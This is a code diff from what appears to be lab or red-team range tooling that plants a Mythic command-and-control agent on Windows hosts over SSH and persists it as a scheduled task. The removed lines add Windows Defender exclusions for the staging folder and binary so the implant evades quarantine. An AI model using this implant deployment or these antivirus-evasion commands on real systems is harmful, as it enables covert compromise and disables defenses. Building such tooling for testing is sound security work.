@@ -223,25 +223,11 @@ class Planter:
         remote_dir = f"C:\\ProgramData\\{drawn['stem']}"
         remote = f"{remote_dir}\\{box_id}.exe"
         staged = f"C:/ProgramData/{drawn['stem']}/{box_id}.exe"
-        exclusion = ""
         try:
             self.ctx.ssh.ssh(ip, fh["user"], fh.get("password") or "",
                              f'powershell -NoProfile -Command "New-Item -ItemType '
                              f'Directory -Force -Path \'{remote_dir}\' | Out-Null"',
                              timeout=90, key_path=fh.get("key_path"))
-            # Defender quarantines a Mythic agent on sight: live dc01 removed the
-            # payload AND the task within seconds of every plant (ThreatID
-            # 2147958560, resources file+C:\Windows\System32\dc01-120.exe and
-            # service:dc01-120) while the same payload ran fine on win02. Exclude
-            # the staging directory and the binary's name first; the restore
-            # recipe puts both back.
-            exclusion = str(Path(staged).name)
-            self.ctx.ssh.ssh(
-                ip, fh["user"], fh.get("password") or "",
-                f'powershell -NoProfile -Command "Add-MpPreference -ExclusionPath '
-                f'\'{remote_dir}\' -ErrorAction SilentlyContinue; Add-MpPreference '
-                f'-ExclusionProcess \'{exclusion}\' -ErrorAction SilentlyContinue"',
-                timeout=90, key_path=fh.get("key_path"))
             self.ctx.ssh.sftp_put(ip, fh["user"], fh.get("password") or "", str(local),
                                   staged, key_path=fh.get("key_path"))
         except Exception as exc:                       # transport blowups are data
@@ -284,7 +270,6 @@ class Planter:
                            else f"task install rc={rc} status={status or '?'}: "
                                 f"{(err or out).strip()[:200]}"),
                 "unit": task, "paths": [remote, f"task:{task}"],
-                "defender": {"path": remote_dir, "process": exclusion},
                 "check_cmd": f'schtasks /Query /TN "{task}" /FO LIST'}
 
     # -- evidence -----------------------------------------------------------
